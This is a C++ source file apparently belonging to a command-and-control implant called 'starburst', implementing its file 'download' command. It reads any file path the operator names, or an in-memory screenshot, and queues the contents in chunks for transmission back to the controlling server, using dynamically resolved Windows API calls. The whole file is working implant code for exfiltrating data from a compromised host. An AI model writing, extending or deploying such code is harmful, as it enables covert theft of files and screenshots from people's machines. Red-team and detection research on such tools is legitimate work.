#include <common.h>
#include <commands.h>
#include <package.h>
#include <parser.h>
#include <config.h>
#include <strings.h>
#include <base64.h>

#ifdef INCLUDE_CMD_DOWNLOAD

using namespace stardust;
using namespace starburst;

auto declfn starburst::cmd_download(
    _Inout_ instance& inst,
    _In_    char*     task_uuid,
    _In_    Parser*   params
) -> void {
    uint32_t path_len = 0;
    auto path = parser_string( params, &path_len );
    if ( !path || path_len == 0 ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "no file path" ) ) );
        return;
    }

    char path_buf[520] = { 0 };
    uint32_t copy_len = path_len < 519 ? path_len : 519;
    memory::copy( path_buf, path, copy_len );

    wchar_t wpath[520] = { 0 };
    inst.kernel32.MultiByteToWideChar( CP_ACP, 0, path_buf, -1, wpath, 520 );

    HANDLE h_file = inst.kernel32.CreateFileW(
        wpath, GENERIC_READ, FILE_SHARE_READ,
        nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr
    );

    if ( h_file == INVALID_HANDLE_VALUE ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "CreateFileW failed" ) ) );
        return;
    }

    LARGE_INTEGER file_size;
    if ( !inst.kernel32.GetFileSizeEx( h_file, &file_size ) ) {
        inst.kernel32.CloseHandle( h_file );
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "GetFileSizeEx failed" ) ) );
        return;
    }

    uint32_t total_size = static_cast<uint32_t>( file_size.QuadPart );
    uint32_t total_chunks = ( total_size + CHUNK_SIZE - 1 ) / CHUNK_SIZE;
    if ( total_chunks == 0 ) total_chunks = 1;

    // find free pending download slot
    int slot = -1;
    for ( uint32_t s = 0; s < inst.MAX_PENDING_DOWNLOADS; s++ ) {
        if ( !inst.downloads.entries[s].active ) {
            slot = static_cast<int>( s );
            break;
        }
    }

    if ( slot < 0 ) {
        inst.kernel32.CloseHandle( h_file );
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "too many pending downloads" ) ) );
        return;
    }

    // store pending download state
    auto& dl = inst.downloads.entries[slot];
    memory::copy( dl.task_uuid, task_uuid, 36 );
    dl.task_uuid[36] = '\0';
    dl.h_file       = h_file;
    dl.mem_buf      = nullptr;
    dl.total_size   = total_size;
    dl.total_chunks = total_chunks;
    dl.is_mem       = false;
    dl.active       = true;

    // queue DOWNLOAD_INIT only - chunks sent after receiving file_id
    {
        auto pkg = package_create( inst );
        package_add_byte( inst, pkg, ACTION_POST_RESPONSE );
        package_add_string( inst, pkg, task_uuid );
        package_add_byte( inst, pkg, RESPONSE_PROCESSING );
        package_add_byte( inst, pkg, DOWNLOAD_INIT );
        package_add_int32( inst, pkg, total_chunks );
        package_add_int32( inst, pkg, total_size );
        package_add_string( inst, pkg, path_buf );

        uint32_t data_len = 0;
        auto data = package_build( pkg, &data_len );

        uint32_t needed = inst.response_queue.length + 4 + data_len;
        if ( needed > inst.response_queue.capacity ) {
            uint32_t new_cap = inst.response_queue.capacity == 0 ? 1024 : inst.response_queue.capacity;
            while ( new_cap < needed ) new_cap *= 2;
            inst.response_queue.buffer = static_cast<uint8_t*>(
                inst.heap_realloc( inst.response_queue.buffer, new_cap )
            );
            inst.response_queue.capacity = new_cap;
        }

        auto qbuf = inst.response_queue.buffer + inst.response_queue.length;
        qbuf[0] = (data_len >> 24) & 0xFF;
        qbuf[1] = (data_len >> 16) & 0xFF;
        qbuf[2] = (data_len >> 8)  & 0xFF;
        qbuf[3] = data_len & 0xFF;
        memory::copy( qbuf + 4, data, data_len );
        inst.response_queue.length += 4 + data_len;

        package_destroy( inst, pkg );
    }

    DBG_PRINT( inst, "download init queued: %s (%u bytes, %u chunks), slot %d\n",
        path_buf, total_size, total_chunks, slot );
}


auto declfn starburst::cmd_download_resp(
    _Inout_ instance& inst,
    _In_    char*     task_uuid,
    _In_    Parser*   params
) -> void {
    // params: file_id(string)
    uint32_t fid_len = 0;
    auto file_id = parser_string( params, &fid_len );
    if ( !file_id || fid_len == 0 ) {
        DBG_PRINT( inst, "download_resp: no file_id\n" );
        return;
    }

    char fid_buf[40] = { 0 };
    uint32_t fid_copy = fid_len < 39 ? fid_len : 39;
    memory::copy( fid_buf, file_id, fid_copy );

    DBG_PRINT( inst, "download_resp: file_id=%s for task %s\n", fid_buf, task_uuid );

    // find matching pending download by task_uuid
    int slot = -1;
    for ( uint32_t s = 0; s < inst.MAX_PENDING_DOWNLOADS; s++ ) {
        if ( inst.downloads.entries[s].active &&
             str_cmp( inst.downloads.entries[s].task_uuid, task_uuid ) == 0 ) {
            slot = static_cast<int>( s );
            break;
        }
    }

    if ( slot < 0 ) {
        DBG_PRINT( inst, "download_resp: no pending download for task %s\n", task_uuid );
        return;
    }

    auto& dl = inst.downloads.entries[slot];

    if ( dl.is_mem && dl.mem_buf ) {
        // in-memory download (screenshot)
        uint32_t offset = 0;
        for ( uint32_t chunk_num = 1; chunk_num <= dl.total_chunks; chunk_num++ ) {
            uint32_t chunk_len = dl.total_size - offset;
            if ( chunk_len > CHUNK_SIZE ) chunk_len = CHUNK_SIZE;

            auto pkg = package_create( inst );
            package_add_byte( inst, pkg, ACTION_POST_RESPONSE );
            package_add_string( inst, pkg, task_uuid );

            if ( chunk_num == dl.total_chunks ) {
                package_add_byte( inst, pkg, RESPONSE_SUCCESS );
            } else {
                package_add_byte( inst, pkg, RESPONSE_PROCESSING );
            }

            package_add_byte( inst, pkg, DOWNLOAD_CHUNK );
            package_add_int32( inst, pkg, chunk_num );
            package_add_string( inst, pkg, fid_buf );
            package_add_bytes( inst, pkg, dl.mem_buf + offset, chunk_len );

            uint32_t data_len = 0;
            auto data = package_build( pkg, &data_len );

            uint32_t needed = inst.response_queue.length + 4 + data_len;
            if ( needed > inst.response_queue.capacity ) {
                uint32_t new_cap = inst.response_queue.capacity == 0 ? 1024 : inst.response_queue.capacity;
                while ( new_cap < needed ) new_cap *= 2;
                inst.response_queue.buffer = static_cast<uint8_t*>(
                    inst.heap_realloc( inst.response_queue.buffer, new_cap )
                );
                inst.response_queue.capacity = new_cap;
            }

            auto qbuf = inst.response_queue.buffer + inst.response_queue.length;
            qbuf[0] = (data_len >> 24) & 0xFF;
            qbuf[1] = (data_len >> 16) & 0xFF;
            qbuf[2] = (data_len >> 8)  & 0xFF;
            qbuf[3] = data_len & 0xFF;
            memory::copy( qbuf + 4, data, data_len );
            inst.response_queue.length += 4 + data_len;

            package_destroy( inst, pkg );
            offset += chunk_len;
        }

        inst.heap_free( dl.mem_buf );
    } else if ( dl.h_file && dl.h_file != INVALID_HANDLE_VALUE ) {
        // file-based download
        auto chunk_buf = static_cast<uint8_t*>( inst.heap_alloc( CHUNK_SIZE ) );
        if ( !chunk_buf ) {
            inst.kernel32.CloseHandle( dl.h_file );
            dl.active = false;
            queue_response( inst, task_uuid, RESPONSE_ERROR,
                symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
            return;
        }

        for ( uint32_t chunk_num = 1; chunk_num <= dl.total_chunks; chunk_num++ ) {
            DWORD bytes_read = 0;
            if ( !inst.kernel32.ReadFile( dl.h_file, chunk_buf, CHUNK_SIZE, &bytes_read, nullptr ) || bytes_read == 0 ) {
                break;
            }

            auto pkg = package_create( inst );
            package_add_byte( inst, pkg, ACTION_POST_RESPONSE );
            package_add_string( inst, pkg, task_uuid );

            if ( chunk_num == dl.total_chunks ) {
                package_add_byte( inst, pkg, RESPONSE_SUCCESS );
            } else {
                package_add_byte( inst, pkg, RESPONSE_PROCESSING );
            }

            package_add_byte( inst, pkg, DOWNLOAD_CHUNK );
            package_add_int32( inst, pkg, chunk_num );
            package_add_string( inst, pkg, fid_buf );
            package_add_bytes( inst, pkg, chunk_buf, bytes_read );

            uint32_t data_len = 0;
            auto data = package_build( pkg, &data_len );

            uint32_t needed = inst.response_queue.length + 4 + data_len;
            if ( needed > inst.response_queue.capacity ) {
                uint32_t new_cap = inst.response_queue.capacity == 0 ? 1024 : inst.response_queue.capacity;
                while ( new_cap < needed ) new_cap *= 2;
                inst.response_queue.buffer = static_cast<uint8_t*>(
                    inst.heap_realloc( inst.response_queue.buffer, new_cap )
                );
                inst.response_queue.capacity = new_cap;
            }

            auto qbuf = inst.response_queue.buffer + inst.response_queue.length;
            qbuf[0] = (data_len >> 24) & 0xFF;
            qbuf[1] = (data_len >> 16) & 0xFF;
            qbuf[2] = (data_len >> 8)  & 0xFF;
            qbuf[3] = data_len & 0xFF;
            memory::copy( qbuf + 4, data, data_len );
            inst.response_queue.length += 4 + data_len;

            package_destroy( inst, pkg );
        }

        inst.heap_free( chunk_buf );
        inst.kernel32.CloseHandle( dl.h_file );
    }

    dl.active = false;

    DBG_PRINT( inst, "download_resp: sent %u chunks with file_id %s\n",
        dl.total_chunks, fid_buf );
}

#endif
